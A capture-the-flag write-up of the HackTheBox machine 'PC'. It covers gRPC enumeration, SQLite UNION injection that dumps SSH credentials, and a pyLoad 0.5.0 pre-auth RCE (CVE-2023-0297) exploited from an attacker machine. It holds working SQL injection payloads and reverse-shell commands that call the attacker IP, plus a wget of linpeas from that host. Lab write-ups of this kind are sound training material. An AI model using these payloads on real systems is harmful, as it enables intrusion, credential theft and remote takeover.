# PC - Easy

```sh
sudo vim /etc/hosts
# add pc.htb

nmap -T4 -p- -A -Pn -v pc.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
    * 50051/tcp - unknown

* checking the port 50051 on web or using ```nc``` gives gibberish characters

* Googling for services associated with port 50051 shows that it is used by gRPC (Google Remote Procedure Call), and is used for microservices

* Googling for gRPC enumeration & pentesting methods leads to several resources that can be used for referring the techniques:

    * [port 50051 enumeration](https://www.pentestpad.com/port-exploit/port-50051-grpc-default-port)
    * [exploitnotes on grpc](https://exploitnotes.org/exploit/network/grpc)
    * [grpc pentesting](https://h3ll-ka1ser.gitbook.io/boot2root/network-penetration-testing/grpc-pentesting)

* gRPC enumeration:

    * using [grpcurl](https://github.com/fullstorydev/grpcurl) for interacting with the service:

        ```sh
        # download and install the package file from the releases
        sudo dpkg -i grpcurl_1.9.3_linux_amd64.deb

        grpcurl pc.htb:50051 list
        # error "first record does not look like a TLS handshake"
        # so it is unencrypted

        grpcurl -plaintext pc.htb:50051 list
        # lists services

        grpcurl -plaintext pc.htb:50051 describe
        # describes services
        ```
    
    * ```grpcurl``` lists 2 services - 'SimpleApp' and 'grpc.reflection.v1alpha.ServerReflection'

    * the 'describe' command shows that these services have the following methods:

        * SimpleApp:

            * LoginUser
            * RegisterUser
            * getInfo
        
        * grpc.reflection.v1alpha.ServerReflection:

            * ServerReflectionInfo
    
    * we can now try to interact with the mentioned services:

        ```sh
        grpcurl -plaintext -d '' pc.htb:50051 SimpleApp/LoginUser
        # "message": "Login unsuccessful"

        grpcurl -plaintext -d '' pc.htb:50051 SimpleApp/getInfo
        # "message": "Authorization Error.Missing 'token' header"

        grpcurl -plaintext -d '' pc.htb:50051 SimpleApp/RegisterUser
        # "message": "username or password must be greater than 4"

        grpcurl -plaintext -d '{"username":"testuser","password":"testpass"}' pc.htb:50051 SimpleApp/RegisterUser
        # "message": "Account created for user testuser!"

        grpcurl -plaintext -d '{"username":"testuser","password":"testpass"}' pc.htb:50051 SimpleApp/LoginUser
        # "message": "Your id is 586."

        grpcurl -plaintext -d '{"id":"586"}' pc.htb:50051 SimpleApp/getInfo
        # "message": "Authorization Error.Missing 'token' header"
        ```
    
    * we are able to register and login a new user, but the 'getInfo' endpoint needs a 'token' header - the parameter 'id' is correct because we do not get an error related to it (if we use 'username' or 'password' parameters for 'getInfo' method we get an error)

    * we can try interacting with the reflection service method, but that does not give anything

    * also, the 'LoginUser' and 'RegisterUser' methods timeout frequently, so we have to register & login again, and this changes the 'id' value as well

    * to view the headers, we need to use the ```-v``` flag for verbose:

        ```sh
        grpcurl -v -plaintext -d '{"username":"testuser","password":"testpass"}' pc.htb:50051 SimpleApp/RegisterUser

        grpcurl -v -plaintext -d '{"username":"testuser","password":"testpass"}' pc.htb:50051 SimpleApp/LoginUser
        # we are able to view the token header now
        # use the updated 'id' value

        grpcurl -v -plaintext -d '{"id":"321"}' -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3NzIzMzE2OTV9.zM_3FFWqiIM1UUvza8HtvEyf5FGf9nTReFSagx_t5CY' pc.htb:50051 SimpleApp/getInfo
        # "message": "Will update soon."
        ```
    
    * the message value does not contain any useful info for the 'getInfo' method

    * if we use an incorrect 'id' value with the right token, we get an empty response

* Googling for exploits related to gRPC leads to multiple articles like [this post](https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9) - it mentions SQL injection is possible in gRPC, so we can try for that:

    ```sh
    # we can test for common SQLi payloads
    grpcurl -v -plaintext -d '{"id":"112""}' -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3NzIzMzIyOTd9.AhR82ygWWl1LY6RSMU2X5QhvQXCXtpO5IjnNFCn3gRs' pc.htb:50051 SimpleApp/getInfo

    grpcurl -v -plaintext -d '{"id":"112 %27"}' -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3NzIzMzIyOTd9.AhR82ygWWl1LY6RSMU2X5QhvQXCXtpO5IjnNFCn3gRs' pc.htb:50051 SimpleApp/getInfo
    
    # single quote does not work well, so we can use URL-encoded form instead

    grpcurl -v -plaintext -d '{"id":"112 %27 OR 1==1"}' -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3NzIzMzIyOTd9.AhR82ygWWl1LY6RSMU2X5QhvQXCXtpO5IjnNFCn3gRs' pc.htb:50051 SimpleApp/getInfo
    # this gives a different response
    # "message": "The admin is working hard to fix the issues."
    ```

* the different response for SQLi payloads confirm that SQL injection in gRPC is possible here - we can continue building on the payloads and testing for other responses:

    ```sh
    grpcurl -v -plaintext -d '{"id":"112 %27 UNION SELECT NULL"}' -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3NzIzMzIyOTd9.AhR82ygWWl1LY6RSMU2X5QhvQXCXtpO5IjnNFCn3gRs' pc.htb:50051 SimpleApp/getInfo
    # "message": "None"

    grpcurl -v -plaintext -d '{"id":"112 %27 UNION SELECT NULL,NULL"}' -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3NzIzMzIyOTd9.AhR82ygWWl1LY6RSMU2X5QhvQXCXtpO5IjnNFCn3gRs' pc.htb:50051 SimpleApp/getInfo
    # gives error 'bad argument type for built-in operation'
    # so it is using only one column

    grpcurl -v -plaintext -d '{"id":"112 %27 UNION SELECT "a" "}' -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3NzIzMzIyOTd9.AhR82ygWWl1LY6RSMU2X5QhvQXCXtpO5IjnNFCn3gRs' pc.htb:50051 SimpleApp/getInfo
    # this gives error for 'invalid character'

    grpcurl -v -plaintext -d '{"id":"112 %27 UNION SELECT 1"}' -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3NzIzMzIyOTd9.AhR82ygWWl1LY6RSMU2X5QhvQXCXtpO5IjnNFCn3gRs' pc.htb:50051 SimpleApp/getInfo
    # "message": "1"
    # this works as it is expecting a value like 'id'

    # we can also test with other chars like semicolon
    grpcurl -v -plaintext -d '{"id":"112; SELECT SLEEP(5)"}' -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3NzIzMzIyOTd9.AhR82ygWWl1LY6RSMU2X5QhvQXCXtpO5IjnNFCn3gRs' pc.htb:50051 SimpleApp/getInfo
    # this gives a different error
    # "Message: Unexpected <class 'sqlite3.Warning'>: You can only execute one statement at a time."
    ```

* the error messages confirm that it is expecting a 'id' like value, and it is using sqlite3 DB in the backend

* we can use [SQLite injection payloads specifically](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) to test further:

    * check SQLite version:

        ```sh
        grpcurl -v -plaintext -d '{"id":"845 %27 UNION SELECT sqlite_version()"}' -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3NzIzMzQxNDd9.tEcP2v_xQUkW7CYVCo6ZglAuYE2nURHOq9hyfbTOIXw' pc.htb:50051 SimpleApp/getInfo
        # this works
        # we get version 3.31.1
        ```
    
    * check table names:

        ```sh
        grpcurl -v -plaintext -d '{"id":"845 %27 UNION SELECT tbl_name FROM sqlite_master WHERE type='table'"}' -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3NzIzMzQxNDd9.tEcP2v_xQUkW7CYVCo6ZglAuYE2nURHOq9hyfbTOIXw' pc.htb:50051 SimpleApp/getInfo
        # this payload does not work

        grpcurl -v -plaintext -d '{"id":"845 %27 UNION SELECT tbl_name FROM sqlite_master"}' -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3NzIzMzQxNDd9.tEcP2v_xQUkW7CYVCo6ZglAuYE2nURHOq9hyfbTOIXw' pc.htb:50051 SimpleApp/getInfo
        # this works
        # "message": "accounts"
        ```
    
    * check column names:

        ```sh
        grpcurl -v -plaintext -d '{"id":"845 %27 UNION SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('accounts');"}' -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3NzIzMzQxNDd9.tEcP2v_xQUkW7CYVCo6ZglAuYE2nURHOq9hyfbTOIXw' pc.htb:50051 SimpleApp/getInfo
        # this does not work

        grpcurl -v -plaintext -d '{"id":"845 %27 UNION SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='accounts'"}' -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3NzIzMzQxNDd9.tEcP2v_xQUkW7CYVCo6ZglAuYE2nURHOq9hyfbTOIXw' pc.htb:50051 SimpleApp/getInfo
        # this also does not work

        grpcurl -v -plaintext -d '{"id":"845 %27 UNION SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='accounts'"}' -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3NzIzMzQxNDd9.tEcP2v_xQUkW7CYVCo6ZglAuYE2nURHOq9hyfbTOIXw' pc.htb:50051 SimpleApp/getInfo
        # does not work

        grpcurl -v -plaintext -d '{"id":"845 %27 UNION SELECT name FROM PRAGMA_TABLE_INFO('accounts')"}' -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3NzIzMzQxNDd9.tEcP2v_xQUkW7CYVCo6ZglAuYE2nURHOq9hyfbTOIXw' pc.htb:50051 SimpleApp/getInfo
        # does not work
        ```
    
    * payloads for fetching column names do not work, so we can assume the column names as 'username' and 'password' given the context

    * check for table data:

        ```sh
        grpcurl -v -plaintext -d '{"id":"845 %27 UNION SELECT username FROM accounts"}' -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3NzIzMzQxNDd9.tEcP2v_xQUkW7CYVCo6ZglAuYE2nURHOq9hyfbTOIXw' pc.htb:50051 SimpleApp/getInfo
        # this works
        # "message": "admin"

        grpcurl -v -plaintext -d '{"id":"845 %27 UNION SELECT GROUP_CONCAT(username) FROM accounts"}' -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3NzIzMzQxNDd9.tEcP2v_xQUkW7CYVCo6ZglAuYE2nURHOq9hyfbTOIXw' pc.htb:50051 SimpleApp/getInfo
        # checking for multiple usernames works
        # "message": "admin,sau"

        grpcurl -v -plaintext -d '{"id":"845 %27 UNION SELECT GROUP_CONCAT(password) FROM accounts"}' -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3NzIzMzQxNDd9.tEcP2v_xQUkW7CYVCo6ZglAuYE2nURHOq9hyfbTOIXw' pc.htb:50051 SimpleApp/getInfo
        # we get the password
        # "message": "admin,HereIsYourPassWord1431"
        ```

* the SQLite injection gives us 2 pairs of creds - 'admin:admin' and 'sau:HereIsYourPassWord1431'

* we can try both of these creds for SSH - the creds for 'sau' user work:

    ```sh
    ssh sau@pc.htb
    # this works

    ls -la

    cat user.txt
    # user flag

    sudo -l
    # user cannot run sudo
    ```

* we can use ```linpeas``` for basic enum - fetch script from attacker:

    ```sh
    wget http://10.10.14.95:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 5.4.0-148-generic, Ubuntu 20.04.6
    * active ports include ports 8000 (listening on 127.0.0.1) and 9666 (listening on 0.0.0.0)
    * non-default files under ```/opt```

* checking the files under ```/opt```:

    ```sh
    ls -la /opt

    ls -la /opt/app
    # files for the gRPC app
    # check all files
    ```

* the files under ```/opt``` do not contain any useful info

* Googling for services running on port 9666 shows that it is used by the pyLoad web interface - a web download manager

* we can also check for any context using ```curl```:

    ```sh
    curl http://localhost:9666
    # redirecting to a login page

    curl http://localhost:8000
    # same response
    ```

* as it is redirecting to a login webpage, we can do local port forwarding to access the login webpage on our attacker machine:

    ```sh
    ssh -L 1234:localhost:8000 sau@pc.htb
    # SSH port forwarding
    ```

* now we can access the login webpage on the attacker machine by navigating to 'http://localhost:1234'

* we get a login page for pyLoad - trying the creds found so far do not work here

* Googling for default creds give 'pyload:pyload' and 'admin:password' - these also do not work

* we can try finding the version info from the webpage - but the source code does not mention anything

* we can try checking for the version info from the CLI, on the target:

    ```sh
    which pyload
    # /usr/local/bin/pyload

    pyload --version
    # 0.5.0
    ```

* Googling for exploits associated with PyLoad 0.5.0 leads to multiple exploits - including [CVE-2023-0297 - a pre-auth RCE vuln](https://www.exploit-db.com/exploits/51532)

* we can attempt this exploit - while the exploit script says it needs to be run from the target machine, since we are able to access the webpage using port forwarding, we can do it from the attacker as well:

    ```sh
    python3 51532.py

    python3 51532.py -u http://localhost:1234 -c id
    # no command output is shown

    # we can try for reverse shell

    nc -nvlp 5555
    # setup listener

    python3 51532.py -u http://localhost:1234 -c 'sh -i >& /dev/tcp/10.10.14.95/5555 0>&1'
    # try with multiple reverse shell payloads

    python3 51532.py -u http://localhost:1234 -c 'busybox nc 10.10.14.95 5555 -e sh'
    # this works
    ```

* the exploit works and we get reverse shell on our listener:

    ```sh
    id
    # root

    cat /root/root.txt
    # root flag
    ```
